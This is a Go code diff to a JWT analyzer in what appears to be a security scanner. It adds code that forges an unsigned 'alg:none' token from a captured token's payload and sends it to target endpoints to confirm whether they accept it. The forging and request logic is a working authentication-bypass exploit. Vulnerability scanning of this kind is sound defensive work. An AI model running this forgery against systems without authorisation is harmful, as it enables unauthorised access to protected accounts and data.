@@ -112,14 +112,17 @@ func (t *JWTAnalyzerTool) Run(ctx context.Context, targets []string, threads int
 
 			alg, _ := headerJSON["alg"].(string)
 
-			// 1. Test None Algorithm
-			if strings.ToLower(alg) == "none" || t.testNoneAlg(parts[0], parts[1]) {
+			// 1. Test None Algorithm and verify server-side acceptance.
+			forgedNoneToken := t.forgeNoneToken(parts[1])
+			if accepted, evidence := t.verifyForgedTokenAccepted(ctx, target, token, forgedNoneToken); accepted || (strings.ToLower(alg) == "none" && accepted) {
 				mu.Lock()
 				events = append(events, NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
 					"vuln_name":   "JWT None Algorithm Allowed",
 					"severity":    "critical",
 					"token":       token,
-					"description": "JWT signature verification bypassed using the 'none' algorithm.",
+					"forged":      forgedNoneToken,
+					"evidence":    evidence,
+					"description": "JWT signature verification bypassed using an 'alg:none' token accepted by the protected endpoint.",
 				}, "critical"))
 				mu.Unlock()
 				slog.Warn("Found JWT vulnerability: None algorithm", "target", target)
@@ -214,8 +217,52 @@ func (t *JWTAnalyzerTool) fetchAndScan(ctx context.Context, target string) []str
 	return tokens
 }
 
-func (t *JWTAnalyzerTool) testNoneAlg(header, _ string) bool {
-	return strings.Contains(strings.ToLower(header), "none")
+func (t *JWTAnalyzerTool) forgeNoneToken(payload string) string {
+	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
+	return header + "." + payload + "."
+}
+
+func (t *JWTAnalyzerTool) verifyForgedTokenAccepted(ctx context.Context, target, originalToken, forgedToken string) (bool, string) {
+	if forgedToken == "" || (!strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://")) {
+		return false, ""
+	}
+	unauthStatus := t.requestWithBearer(ctx, target, "")
+	originalStatus := t.requestWithBearer(ctx, target, originalToken)
+	forgedStatus := t.requestWithBearer(ctx, target, forgedToken)
+	forgedOK := forgedStatus >= 200 && forgedStatus < 300
+	unauthDenied := unauthStatus == http.StatusUnauthorized || unauthStatus == http.StatusForbidden
+	originalOK := originalStatus >= 200 && originalStatus < 300
+	if forgedOK && (unauthDenied || originalOK || originalStatus == http.StatusUnauthorized || originalStatus == http.StatusForbidden) {
+		return true, fmt.Sprintf("unauth=%d original=%d forged_none=%d", unauthStatus, originalStatus, forgedStatus)
+	}
+	return false, ""
+}
+
+func (t *JWTAnalyzerTool) requestWithBearer(ctx context.Context, target, token string) int {
+	client := NewSafeHTTPClient(10 * time.Second)
+	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
+		return http.ErrUseLastResponse
+	}
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
+	if err != nil {
+		return 0
+	}
+	for k, v := range HeadersFromCtx(ctx) {
+		if strings.EqualFold(k, "Authorization") {
+			continue
+		}
+		req.Header.Set(k, v)
+	}
+	if token != "" {
+		req.Header.Set("Authorization", "Bearer "+token)
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		return 0
+	}
+	defer resp.Body.Close()
+	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1024))
+	return resp.StatusCode
 }
 
 func (t *JWTAnalyzerTool) verifyHS256(header, payload, signature, secret string) bool {
